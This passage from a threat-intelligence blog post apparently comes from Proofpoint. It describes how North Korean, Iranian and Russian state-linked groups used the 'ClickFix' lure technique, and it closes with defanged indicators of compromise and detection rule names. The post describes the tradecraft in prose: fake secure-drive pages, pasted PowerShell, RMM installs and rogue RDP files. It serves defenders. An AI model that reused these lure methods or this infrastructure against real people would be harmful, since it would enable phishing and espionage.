+tr-threat-insight-paper-triple-threat-N-Korea-aligned-TA406-steals-scams-
+spies.pdf). Proofpoint attributes this activity to TA427 based on
+infrastructure overlap, TTPs, and malware.
+
+#### Network Infrastructure Analysis
+
+Further investigation into the delivery infrastructure found several other
+servers and staging URLs with largely similar themes. Proofpoint researchers
+also observed TA427 use Japanese, Korean, and English-language content in this
+campaign, customized to align with the spoofed senders. An example of another
+secure drive spoof in Korean is shown below.
+
+![cscs](/sites/default/files/inline-images/cscs.png)
+
+_Fake secure drive example from mid-January 2025._
+
+TA427 used Dynamic DNS (DDNS) services for this campaign, primarily hosted on
+servers located in South Korea that have likely been compromised. In all cases
+the attackers used either the FreeDNS or No-IP DDNS services and spoofed a
+secure drive or account profile as subdomains. All the infrastructure related
+to this activity was set up no earlier than January 2025.
+
+In the same month, Microsoft
+[observed](https://x.com/MsftSecIntel/status/1889407814604296490) a variation
+of TA427’s ClickFix infection chain, similarly with a URL to register a device
+and run PowerShell commands. In this variation, the code installed a browser-
+based remote desktop tool and downloaded a certificate and PIN used to
+register the victim device. It is likely that TA427 made multiple attempts to
+use the ClickFix technique with different versions over several weeks, before
+returning to tried-and-tested techniques shortly after.
+
+### Iran: TA450
+
+On 13 and 14 November 2024, TA450 used an attacker-controlled email address
+support@microsoftonlines[.]com to send an English-language phish to targets in
+at least 39 organizations in the Middle East. TA450 overlaps with groups third
+parties refer to as MuddyWater and Mango Sandstorm. The email masqueraded as a
+security update from Microsoft with the subject line: “Urgent Security Update
+Required – Immediate Action Needed” to convince individuals to execute a
+series of steps to address a security vulnerability.
+
+The attackers deployed the ClickFix technique by persuading the target to
+first run PowerShell with administrator privileges, then copy and run a
+command contained in the email body. The command was responsible for
+installing remote management and monitoring (RMM) software – in this case,
+Level – after which TA450 operators will abuse the RMM tool to conduct
+espionage and exfiltrate data from the target’s machine.
+
+The infection chain can be seen below:
+
+ ![TA450 ClickFix infection chain](/sites/default/files/inline-
+images/TA450%20ClickFix%20infection%20chain.png)
+
+_TA450 ClickFix infection chain._
+
+On 15 November, the [Israeli National Cyber Directorate
+reported](https://www.gov.il/he/pages/alert_1826) that the command would load
+a specific RMM tool called Level. While Proofpoint has observed TA450
+historically using several [RMM tools](/us/blog/threat-insight/remote-
+monitoring-and-management-rmm-tooling-increasingly-attackers-first-choice
+"Remote Monitoring and Management \(RMM\) Tooling Increasingly an Attacker’s
+First Choice"), such as Atera, PDQ Connect, ScreenConnect, and SimpleHelp as a
+foothold to conduct intrusions, this was the first sighting of Level in
+Proofpoint data.
+
+![TA450 phish \(INCD\)](/sites/default/files/inline-
+images/TA450%20phish%20%28INCD%29.png)
+
+_TA450 phish (INCD)._
+
+This attribution is based on known TA450 TTPs, campaign targeting, and malware
+analysis. However, while typical TA450 RMM campaigns have consistently
+targeted organizations in Israel, the group’s ClickFix campaign was broader in
+scope.
+
+As shown in the heatmap below, Proofpoint researchers observed TA450 targets
+distributed primarily across the Middle East with an emphasis on the UAE and
+Saudi Arabia, but with global targets as well.
+
+![TA450 ClickFix campaign target heatmap](/sites/default/files/inline-
+images/TA450%20ClickFix%20campaign%20target%20heatmap.png)
+
+_TA450 ClickFix campaign target heatmap._
+
+The targets spanned several sectors, but finance and government organizations
+were among the more popular targets.
+
+![TA450 ClickFix target breakdown by sector](/sites/default/files/inline-
+images/TA450%20ClickFix%20target%20breakdown%20by%20sector.png)
+
+_TA450 ClickFix target breakdown by sector._
+
+At the time of writing, no further instances of TA450 using ClickFix have been
+observed since the initial sighting in November 2024. However, TA450 has
+remained consistent in its typical targeting of Israel and tactics using RMMs
+in subsequent months.
+
+### Russia: UNK_RemoteRogue and TA422
+
+North Korean and Iranian state actors aren’t the only ones experimenting with
+ClickFix. A suspected Russian group tracked as UNK_RemoteRogue was also seen
+using it at the end of 2024 in the following infection chain.
+
+![UNK_RemoteRogue ClickFix infection chain](/sites/default/files/inline-
+images/UNK_RemoteRogue%20ClickFix%20infection%20chain.png)
+
+_UNK_RemoteRogue ClickFix infection chain._
+
+Beginning on 9 December 2024, a targeted campaign used compromised
+infrastructure to send 10 messages to individuals in two organizations
+associated with a major arms manufacturer in the defense industry. The
+messages did not contain a subject line and abused various likely compromised
+Zimbra servers as intermediate sending infrastructure, which then populated
+the ‘From’ fields. The emails contained a malicious link that spoofed
+Microsoft Office with the title “RSVP Office - Створюйте, редагуйте документи
+та діліться ними в Інтернеті”:
+
+         hxxps://office[.]rsvp/fin?document=2hg6739jhngdf7892w0p93u4yh5g
+
+The link description translated to “RSVP Office - Create, edit and share
+documents online.” If the target visited the link, it displayed HTML that
+spoofed a Microsoft Word document with ClickFix-style instructions in Russian
+to copy code from the browser into their terminal. The webpage included a link
+to a YouTube video tutorial on how to run PowerShell.
+
+![UNK_RemoteRogue ClickFix landing page spoofing Microsoft
+Word](/sites/default/files/inline-
+images/UNK_RemoteRogue%20ClickFix%20landing%20page%20spoofing%20Microsoft%20Word.png)
+
+_UNK_RemoteRogue ClickFix landing page spoofing Microsoft Word._
+
+The commands pasted in the terminal ran malicious JavaScript that then
+executed PowerShell code linked to the Empire C2 framework.
+
+Proofpoint observed UNK_RemoteRogue’s use of ClickFix only once, after which
+the group returned to its traditional campaigns, which display many of the
+same features, including the use of compromised intermediate mailservers, the
+same upstream sending host, and highly similar targeting. In January 2025, the
+domain office[.]rsvp began resolving to 5.231.4[.]94, which was also hosting
+ukrtelcom[.]com and mail.ukrtelecom[.]eu. These domains were seen in further
+UNK_RemoteRogue phishing activity the same month. [Research from
+DomainTools](https://dti.domaintools.com/phishing-campaign-targets-defense-
+and-aerospace-firms-linked-to-ukraine-conflict/) highlighted additional
+UNK_RemoteRogue infrastructure.
+
+On 28 January, UNK_RemoteRogue returned in a campaign that showed the group’s
+consistent abuse of compromised mailservers as intermediate senders via
+80.66.66[.]197 as the upstream concentrator. The group forged the ‘From’
+header in the targeted emails to spoof Ukrainian entities as well as
+telecommunications and defence companies, and the messages delivered RDP
+files. Later campaigns in February 2025 used a password-protected link to
+facilitate delivery of the RDP files.
+
+![UNK_RemoteRogue phishing email with RDP attachment in January
+2025](/sites/default/files/inline-
+images/UNK_RemoteRogue%20phishing%20email%20with%20RDP%20attachment%20in%20January%202025.png)
+
+_UNK_RemoteRogue phishing email with RDP attachment in January 2025._
+
+If the targets’ hosts allow for remote connections, the downloaded file will
+create an RDP connection that includes connection of all attached drives and
+[redirect clipboard data and web authentication
+attempts](https://cloud.google.com/blog/topics/threat-intelligence/windows-
+rogue-remote-desktop-protocol/) to a remote host. In Proofpoint Threat
+Research’s investigation of cloud data, the 80.66.66[.]197 IP was observed
+attempting to log in to Office 365 Exchange accounts of users working in
+individual US state governments in late February 2025.
+
+Another sighting of ClickFix came from an established Russian group on 17
+October 2024. CERT-UA [observed](https://cert.gov.ua/article/6281123) TA422
+send phishing emails containing a link that mimicked a Google spreadsheet.
+TA422 overlaps with activity third parties call Sofacy and APT28. This led to
+a reCAPTCHA prompt, which when clicked, would copy and paste a PowerShell
+command along with displaying a further dialogue box with instructions to run
+the command. The PowerShell creates an SSH tunnel and runs Metasploit.
+
+### Conclusion
+
+As with other criminal – and often creative and novel – techniques, state-
+sponsored actors observe and emulate other groups (sometimes with a convenient
+byproduct of muddling attribution). Multiple examples of state-sponsored
+actors using ClickFix have shown not only the technique’s popularity among
+state actors, but also its use by various countries within weeks of one
+another.
+
+The timeline below shows each ClickFix sighting among the typical cadence of
+state-sponsored actor’s campaigns. In most cases, the groups returned to
+standard campaigns after their ClickFix campaigns. TA422 is an exception as no
+further campaigns were observed; however, this is likely due to Proofpoint
+visibility rather than a lack of subsequent activity.
+
+![Timeline of standard campaigns and ClickFix sightings \(Jul 2024 – Mar
+2025\)](/sites/default/files/inline-
+images/Timeline%20of%20standard%20campaigns%20and%20ClickFix%20sightings%20%28Jul%202024%20%E2%80%93%20Mar%202025%29.png)
+
+_Timeline of standard campaigns and ClickFix sightings (Jul 2024 – Mar 2025)._
+
+While several ClickFix sightings were observed, no actor had shown repeated
+use of the technique in the weeks following. It is unclear why each actor was
+only observed with one ClickFix campaign or wave while other typical campaigns
+continue in parallel. We initially hypothesized that this may be due to the
+technique’s early days among state-sponsored actors as they trial it, or
+perhaps the technique did not have as much success as others for machine
+compromise. However, recent Proofpoint investigations found that as the group
+continued with its typical campaigns, TA427 returned to ClickFix with a
+slightly varied infection chain in April, over two months after the initial
+sightings. This likely indicates that TA427 is further developing how it uses
+the ClickFix technique in its operations, and more sightings are likely in the
+coming months.
+
+Although not a persistently used technique, it is likely that more threat
+actors from [North Korea](https://blog.sekoia.io/clickfake-interview-campaign-
+by-lazarus/), Iran, and Russia have also tried and tested ClickFix or may in
+the near future. Given the technique’s trajectory around the world, there is a
+conspicuous absence in the use of ClickFix by a Chinese state-sponsored actor
+in Proofpoint investigations. However, this is likely due to visibility, and
+there is a high probability that a China-nexus group has also experimented
+with ClickFix, given its appearance across many actors’ campaigns in a short
+period of time.
+
+### Indicators of compromise
+
+Certain PDF hashes have been excluded from the indicator list because they
+were personalized to the target.
+
+**TA427 Network Indicators  **  
+---  
+Indicator  |  Type  |  Description  |  First Seen   
+yasuyuki.ebata21@proton[.]me  |  Email address  |  Sender email  |  February 2025   
+eunsoolim29@gmail[.]com  |  Email address  |  Sender email  |  January 2025   
+115.92.4[.]123  |  IP  |  Likely legitimate but compromised server  |  January 2025   
+121.179.161[.]230  |  IP  |  Likely legitimate but compromised server  |  January 2025   
+121.179.161[.]231  |  IP  |  Likely legitimate but compromised server  |  January 2025   
+172.86.111[.]75  |  IP  |  Likely legitimate but compromised server  |  January 2025   
+210.179.30[.]213  |  IP  |  Likely legitimate but compromised server  |  January 2025   
+221.144.93[.]250  |  IP  |  Likely legitimate but compromised server  |  January 2025   
+118.194.228[.]184  |  IP  |  Likely legitimate but compromised server  |  January 2025   
+14.34.85[.]86  |  IP  |  Likely legitimate but compromised server  |  January 2025   
+38.180.157[.]197  |  IP  |  QuasarRAT C2  |  January 2025   
+securedrive.networkguru[.]com  |  Domain  |  Payload delivery  |  January 2025   
+securedrive.servehttp[.]com  |  Domain  |  Payload delivery  |  January 2025   
+securedrive-mofa.servehttp[.]com  |  Domain  |  Payload delivery  |  January 2025   
+login-accounts.servehttp[.]com  |  Domain  |  Payload delivery  |  January 2025   
+accounts-myservice.servepics[.]com  |  Domain  |  Payload delivery  |  January 2025   
+securedrive.netsecgroup[.]com  |  Domain  |  Payload delivery  |  January 2025   
+securedrive.privatedns[.]org  |  Domain  |  Payload delivery  |  January 2025   
+drive.us-dos.securitel[.]com  |  Domain  |  Payload delivery  |  March 2025   
+securedrive.fin-tech[.]com  |  Domain  |  Payload delivery  |  January 2025   
+securedrive.opticalize[.]com  |  Domain  |  Payload delivery  |  January 2025   
+securedrive.dob[.]jp  |  Domain  |  Payload delivery  |  February 2025   
+accounts-porfile.serveirc[.]com  |  Domain  |  Payload delivery  |  February 2025   
+account-profile.servepics[.]com  |  Domain  |  Payload delivery  |  February 2025   
+freedrive.servehttp[.]com  |  Domain  |  Payload delivery  |  March 2025   
+e-securedrive.mofa.mtomtech.co[.]kr  |  Domain  |  Payload delivery  |  April 2025   
+securedrive.root[.]sx  |  Domain  |  Payload delivery  |  February 2025   
+myaccounts-profile.servehttp[.]com  |  Domain  |  Payload delivery  |  April 2025   
+undocs.myvnc[.]com  |  Domain  |  Payload delivery  |  April 2025   
+undocs.servehttp[.]com  |  Domain  |  Payload delivery  |  April 2025   
+raedom[.]store  |  Domain  |  C2  |  January 2025   
+hxxps://securedrive.root[.]sx:8443/us.emb-japan.go.jp/doc/eh  |  URL  |  Landing page  |  February 2025   
+hxxps://securedrive[.]root[.]sx:8443/us.emb-japan.go.jp/doc/eh/alert  |  URL  |  ClickFix pop-up  |  February 2025   
+hxxps://securedrive[.]root[.]sx:8443/us.emb-japan.go.jp/doc/eh/register  |  URL  |  ClickFix pop-up  |  February 2025   
+hxxps://securedrive.fin-tech[.]com/docs/en/  |  URL  |  Landing page  |  January 2025   
+hxxps://securedrive.fin-tech[.]com/docs/en/alert  |  URL  |  ClickFix pop-up  |  January 2025   
+hxxps://securedrive.fin-tech[.]com/docs/en/register  |  URL  |  ClickFix pop-up  |  January 2025   
+hxxps://securedrive.fin-tech[.]com/docs/en/t.vmd  |  URL  |  Hosting URL for PowerShell  |  January 2025   
+hxxps://securedrive.fin-tech[.]com/docs/en/src/pdf_0.pdf  |  URL  |  Hosting URL for decoy PDF  |  January 2025   
+hxxps://securedrive.fin-tech[.]com/docs/en/src/resp.php  |  URL  |  Redirect URL  |  January 2025   
+hxxps://raedom[.]store/[REDACTED]/demo.php?ccs=cin  |  URL  |  VBS script C2  |  January 2025   
+hxxps://bit-albania[.]com/[REDACTED]/demo.php?ccs=cin  |  URL  |  VBS script C2 (compromised)  |  February 2025   
+  
+
+
+**TA427 Malware Indicators  ** |    |    |    |     
+---|---|---|---|---  
+Indicator  |  Type  |  Filename  |  Description  |  First Seen   
+06816634fb019b6ed276d36f414f3b36f99b845ddd1015c2b84a34e0b8d7f083  |  SHA256  |  Letter from Ambassador Cho Hyun-Dong.pdf  |  Lure document  |  January 2025   
+0ff9c4bba39d6f363b9efdfa6b54127925b8c606ecef83a716a97576e288f6dd  |  SHA256  |  temp.vbs  |  Stager script  |  January 2025   
+18ee1393fc2b2c1d56d4d8f94efad583841cdf8766adb95d7f37299692d60d7d  |  SHA256  |  temp.vbs  |  Stager script  |  February 2025   
+e410ffadb3f5b6ca82cece8bce4fb378a43c507e3ba127ef669dbb84e3c73e61  |  SHA256  |  1.bat  |  Loader  |  January 2025   
+78aa2335d3e656256c50f1f2c544b32713790857998068a5fa6dec1fb89aa411  |  SHA256  |  2.bat  |  Loader  |  January 2025   
+07a45c7a436258aa81ed2e770a233350784f5b05538da8a1d51d03c55d9c0875  |  SHA256  |  adobe.ps1  |  Dropper  |  January 2025   
+f9536b1d798bee3af85b9700684b41da67ff9fed79aae018a47af085f75c9e3e  |  SHA256  |  mer.ps1  |  Dropper  |  January 2025   
+85db55aab78103f7c2d536ce79e923c5fd9af14a2683f8bf290993828bddeb50  |  SHA256  |  Unknown  |  QuasarRAT  |  January 2025   
+  
+
+
+**TA450 Network Indicators  **  
+---  
+Indicator  |  Type  |  Description  |  First Seen   
+support@microsoftonlines[.]com  |  Email address  |  Sender email  |  November 2024   
+microsoftonlines[.]com  |  Domain  |  Phishing  |  November 2024   
+  
+
+
+**UNK_RemoteRogue Network Indicators  **  
+---  
+Indicator  |  Type  |  Description  |  First Seen   
+office[.]rsvp  |  Domain  |  Email delivery  |  December 2024   
+mail.ukrtelecom[.]eu  |  Domain  |  Phishing  |  January 2025   
+ukrtelecom[.]eu  |  Domain  |  Phishing  |  January 2025   
+ukrtelecom[.]com  |  Domain  |  Phishing  |  January 2025   
+hxxps://office[.]rsvp/fin?document=2hg6739jhngdf7892w0p93u4yh5g  |  URL  |  Landing page  |  December 2024   
+80.66.66[.]197  |  IP  |  Email delivery  |  December 2024   
+5.231.4[.]94  |  IP   |  Email delivery  |  January 2025   
+  
+
+
+**UNK_RemoteRogue Malware Indicators  **  
+---  
+Indicator  |  Type  |  Description  |  First Seen   
+bfb11abb82ab4c788156df862a5cf4fa085f1ac3203df7a46251373d55cc587c  |  SHA256  |  HTML landing page  |  December 2024   
+8a8c57eedca1bd03308198a87cae7977d3c385f240c5c62ac7c602126a1a312f  |  SHA256  |  JavaScript executes PowerShell  |  December 2024   
+  
+###  
+
+### ET Rules
+
+[**2061585 - ET PHISHING Observed DNS Query to TA450 Domain (microsoftonlines
+.com)**](https://threatintel.proofpoint.com/sid/2061585)
+
+[**2061586 - ET PHISHING Observed TA450 Domain in TLS SNI (microsoftonlines
+.com in TLS SNI)**](https://threatintel.proofpoint.com/sid/2061586)
+
+
+
+[**2061587 - ET PHISHING Observed DNS Query to UNK_RemoteRogue Domain (office
+.rsvp)**](https://threatintel.proofpoint.com/sid/2061587)
+
+[**2061588 - ET PHISHING Observed DNS Query to UNK_RemoteRogue Domain
+(ukrtelecom .com)**](https://threatintel.proofpoint.com/sid/2061588)
+
+[**2061589 - ET PHISHING Observed DNS Query to UNK_RemoteRogue Domain
+(ukrtelecom .eu)**](https://threatintel.proofpoint.com/sid/2061589)
+
+[**2061590 - ET PHISHING Observed UNK_RemoteRogue Domain in TLS SNI (office
+.rsvp in TLS SNI)**](https://threatintel.proofpoint.com/sid/2061590)
+
+[**2061591 - ET PHISHING Observed UNK_RemoteRogue Domain in TLS SNI
+(ukrtelecom .com in TLS
+SNI)**](https://threatintel.proofpoint.com/sid/2061591)
+
+[**2061592 - ET PHISHING Observed UNK_RemoteRogue Domain in TLS SNI
+(ukrtelecom .eu in TLS SNI)**](https://threatintel.proofpoint.com/sid/2061592)
+
+
+
+[**2061593 - ET MALWARE Observed DNS Query to TA427 Domain (raedom
+.store)**](https://threatintel.proofpoint.com/sid/2061593)
+
+[**2061594 - ET MALWARE Observed TA427 Domain in TLS SNI (raedom .store in TLS
+SNI)**](https://threatintel.proofpoint.com/sid/2061594)
+
+
+
+[Previous Blog Post](/us/blog/threat-insight/remote-monitoring-and-management-
+rmm-tooling-increasingly-attackers-first-choice)
+
+[Next Blog Post](/us/blog/threat-insight/security-brief-french-bec-threat-
+actor-targets-property-payments)
+
+###  Subscribe to the Proofpoint Blog
+
+![](/themes/custom/proofpoint/dist/app-drupal/assets/footer_contact.webp)
+
+## Turn _people_ into your _best defense_ with Proofpoint
+
+[ Get in Touch ](/us/contact)
+
+Products
+
+  * [Collaboration Security](/us/products/threat-protection)
+  * [Data Security and Governance](/us/products/defend-data)
+
+Partners
+
+  * [Channel Partners and Distributors](/us/channel-partners-and-distributors)
+  * [MSP Partners](/us/partners/msp)
+  * [Technology and Alliance Partners](/us/partners/technology-alliance-partners)
+
+Get Support
+
+  * [Product Support Login](https://proofpoint.my.site.com/community/s/)
+  * [Support Services](/us/support-services)
+  * [IP Address Blocked?](/us/postmaster)
+
+More
+
+  * [About Proofpoint](/us/company/about)
+  * [Why Proofpoint](/us/why-proofpoint)
+  * [How to Buy](/us/products/how-to-buy/collaboration-security)
+  * [Careers](/us/company/careers)
+  * [Leadership Team](/us/company/leadership)
+  * [News Center](/us/newsroom)
+  * [AI, Privacy and Trust](/us/legal/trust)
+  * [Hornetsecurity](https://www.proofpoint-total-protection.com/)
+
+Connect with Us
+
+  *     * [Facebook](http://www.facebook.com/proofpoint)
+    * [X](https://x.com/proofpoint)
+    * [LinkedIn](https://www.linkedin.com/company/proofpoint)
+    * [YouTube](https://www.youtube.com/channel/UCIvtJgsrUzFo90NKeiVozhQ)
+    * [Instagram](https://www.instagram.com/proofpoint)
+  * [+1 408 517 4710](tel:+1 408 517 4710)
+  * [Attend an Event](/us/events)
+  * [Contact Us](/us/contact)
+  * [Free Demo Request](/us/free-demo-request)
+
+[ Proofpoint home ](/us)
+
+(C) 2026\. All rights reserved.
+
+[Terms and conditions](/us/legal/license) [Privacy Policy](/us/legal/privacy-
+policy) [Sitemap](/us/sitemap) Cookie Settings
+
+![](//googleads.g.doubleclick.net/pagead/viewthroughconversion/950296937/?value=0&guid=ON&script=0)
+
